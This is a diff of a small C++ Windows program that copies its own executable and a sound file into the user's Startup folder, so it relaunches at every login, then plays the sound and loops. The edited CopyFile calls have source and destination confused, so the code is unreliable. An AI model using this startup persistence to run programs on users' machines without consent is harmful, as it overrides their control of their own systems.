@@ -24,11 +24,13 @@ int main(void)
 
      char * user = getenv("username");
      int counter = 15;
-     std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe";
+     std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
      std::string filename = "main.exe";
      std::string sound = "FX9eEhoRZhY.wav";
-     CopyFile(filename.c_str(), startup.c_str(),true);
-     CopyFile(sound.c_str(), startup.c_str(),true);
+     std::string final = startup + filename;
+     std::string final1 = startup + sound;
+     CopyFile(final.c_str(), startup.c_str(),true);
+     CopyFile(final1.c_str(), startup.c_str(),true);
      PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
 
      while (counter >= 1)
